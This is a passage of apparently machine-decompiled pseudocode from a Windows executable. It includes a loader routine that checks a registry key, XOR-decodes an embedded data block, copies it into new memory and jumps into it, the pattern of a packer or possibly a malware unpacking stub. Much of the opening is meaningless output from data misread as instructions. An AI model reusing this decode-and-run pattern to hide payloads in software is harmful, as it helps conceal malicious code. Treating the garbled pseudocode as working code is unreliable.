    tmp8_29 = reinterpret_cast<unsigned char>(*reinterpret_cast<unsigned char*>(edx14 - 0x33ffffe5) + bh30);
    cf31 = reinterpret_cast<uint1_t>(tmp8_29 < *reinterpret_cast<unsigned char*>(edx14 - 0x33ffffe5));
    *reinterpret_cast<unsigned char*>(edx14 - 0x33ffffe5) = tmp8_29;
    eax32 = reinterpret_cast<int32_t*>(reinterpret_cast<uint32_t>(eax28) - (*eax28 + reinterpret_cast<uint1_t>(reinterpret_cast<uint32_t>(eax28) < *eax28 + cf31)));
    tmp8_33 = reinterpret_cast<unsigned char>(*reinterpret_cast<unsigned char*>(&edx14) + bl34);
    *reinterpret_cast<unsigned char*>(&edx35) = tmp8_33;
    eax36 = reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax32) - (*eax32 + reinterpret_cast<uint1_t>(reinterpret_cast<uint32_t>(eax32) < *eax32 + reinterpret_cast<uint1_t>(tmp8_33 < *reinterpret_cast<unsigned char*>(&edx14)))));
    *reinterpret_cast<unsigned char*>(ebx37 + ebx38) = reinterpret_cast<unsigned char>(*reinterpret_cast<signed char*>(ebx39 + ebx40) + *reinterpret_cast<unsigned char*>(&eax36));
    *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
    __asm__("outsd ");
    edi41->f65 = edi42->f65 + reinterpret_cast<uint32_t>(eax36);
    if (edi43->f65) {
        __asm__("outsd ");
        __asm__("insd ");
        __asm__("insd ");
        __asm__("popad ");
        __asm__("outsb ");
        __asm__("outsd ");
        __asm__("popad ");
        esp2 = reinterpret_cast<void*>(edx35->f72 * 0x41797261);
        *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
        zf44 = (*ecx & 71) == 0;
        if (zf44) {
            addr_401bf9_3:
            *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
            *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
            *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
        } else {
            __asm__("outsd ");
            if (zf44) {
                --eax36;
                __asm__("popad ");
                __asm__("outsb ");
                __asm__("insb ");
                ++ecx;
                *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
                edx35->f0 = reinterpret_cast<unsigned char>(edx35->f0 & *reinterpret_cast<unsigned char*>(&eax36));
                if (edi45 + 1) {
                    if (!0) {
                        __asm__("arpl [ecx+0x64], ax");
                        if (!0) {
                            if (!1) {
                                *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
                                ebx46 = reinterpret_cast<struct s14*>(reinterpret_cast<int32_t>(ebx47) + 1);
                            }
                        }
                    }
                }
            }
        }
    }
    tmp8_48 = reinterpret_cast<unsigned char>(ebx46->f6c + *reinterpret_cast<unsigned char*>(&eax36));
    cf49 = tmp8_48 < ebx46->f6c;
    ebx46->f6c = tmp8_48;
    __asm__("outsd ");
    if (cf49) {
        --eax36;
        __asm__("popad ");
        __asm__("outsb ");
        __asm__("insb ");
        *reinterpret_cast<unsigned char*>(reinterpret_cast<int32_t>(esp2) + reinterpret_cast<uint32_t>(eax36) + 86) = reinterpret_cast<unsigned char>(*reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(esp2) + reinterpret_cast<uint32_t>(eax36) + 86) + *reinterpret_cast<unsigned char*>(&edx35));
        __asm__("insb ");
        __asm__("insb ");
        __asm__("outsd ");
        __asm__("arpl [eax], ax");
        ebx46->f45 = reinterpret_cast<signed char>(ebx46->f45 + *reinterpret_cast<signed char*>(&ecx));
        *reinterpret_cast<struct s10**>(reinterpret_cast<int32_t>(esp2) - 4) = edx35;
        __asm__("insb ");
        __asm__("insb ");
        *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
        *eax36 = reinterpret_cast<unsigned char>(*eax36 + *reinterpret_cast<unsigned char*>(&eax36));
        goto addr_401bf9_3;
    }
}

int32_t GetCommandLineA = 0x1b84;

void fun_401070(int32_t ecx, int32_t a2, signed char a3, int32_t a4) {
    int32_t v5;

    v5 = 0;
    while (v5 < a4) {
        GetCommandLineA();
        *reinterpret_cast<signed char*>(a2 + v5) = a3;
        ++v5;
    }
    return;
}

uint32_t g403000 = 0x3f81;

int32_t g403004 = 0x5200;

struct s0* g407040 = reinterpret_cast<struct s0*>(0);

int32_t g407030 = 0;

int32_t g407028 = 0;

int32_t g40703c = 0;

struct s2* g18;

void* g407038 = reinterpret_cast<void*>(0);

int32_t fun_4010b0(struct s0* a1) {
    void* ebp2;
    int32_t v3;
    int32_t ebx4;
    struct s0* v5;
    struct s0* esi6;
    struct s0* v7;
    struct s0* edi8;
    struct s0* eax9;
    struct s0* v10;
    struct s0* v11;
    int1_t zf12;
    struct s0* ecx13;
    struct s0* eax14;
    struct s0* v15;
    struct s0* v16;
    struct s0* v17;
    struct s0* v18;
    struct s0* v19;
    struct s0* v20;
    void* eax21;
    struct s0* v22;
    int32_t eax23;
    uint32_t ecx24;
    uint32_t v25;
    int32_t eax26;
    int32_t v27;
    uint32_t v28;
    struct s0* eax29;
    struct s0* edx30;
    int32_t edi31;
    int32_t esi32;
    int32_t ebx33;
    struct s2* ecx34;
    int1_t zf35;
    struct s0* edx36;

    ebp2 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    v3 = ebx4;
    v5 = esi6;
    v7 = edi8;
    eax9 = reinterpret_cast<struct s0*>(GetModuleHandleA(0, v7, v5, v3));
    v10 = eax9;
    v11 = a1;
    if (!(reinterpret_cast<uint32_t>(v11) & 0xffff)) {
        g407044 = 1;
    } else {
        g407044 = 0;
    }
    if (!v11) {
        g407044 = 0;
    }
    zf12 = g407044 == 0;
    if (!zf12) {
        ecx13 = v11;
        g407034 = ecx13;
    }
    eax14 = reinterpret_cast<struct s0*>(LoadLibraryA("advapi32.dll", "RegOpenKeyA", 0, v7, v5, v3));
    eax21 = fun_401270(ecx13, eax14, "advapi32.dll", "RegOpenKeyA", 0, v7, v5, v3, v15, v16, v17, v18, v10, v19, v11, v20);
    v22 = reinterpret_cast<struct s0*>(reinterpret_cast<int32_t>(ebp2) - 0x84);
    eax23 = reinterpret_cast<int32_t>(eax21());
    if (eax23) {
        return 0;
    }
    ecx24 = g403000;
    v25 = ecx24;
    eax26 = g403004;
    v27 = eax26;
    v28 = 0;
    while (v28 < v25) {
        *reinterpret_cast<uint32_t*>(0x403000 + v28 + 8) = *reinterpret_cast<uint32_t*>(0x403000 + v28 + 8) ^ 0x56ce;
        v28 = v28 + 8;
    }
    eax29 = fun_401830(v27);
    g407040 = eax29;
    edx30 = g407040;
    fun_4019e0(0x403008, edx30, v25);
    g407030 = edi31;
    g407028 = esi32;
    g40703c = ebx33;
    ecx34 = g18;
    g407048 = ecx34;
    g407038 = ebp2;
    zf35 = g407044 == 0;
    if (!zf35) 
        goto addr_40120c_16;
    fun_401860(0x401234 - reinterpret_cast<uint32_t>(v10), v10, 0x80000002, "SOFTWARE\\Classes\\.dll", v22, "RegOpenKeyA", 0, v7, v5, v3);
    addr_401234_18:
    edx36 = g407040;
    fun_401290(edx36);
    goto g40704c;
    addr_40120c_16:
    fun_401860(0x401234 - reinterpret_cast<uint32_t>(v11), v11, 0x80000002, "SOFTWARE\\Classes\\.dll", v22, "RegOpenKeyA", 0, v7, v5, v3);
    goto addr_401234_18;
}

void fun_401261() {
}
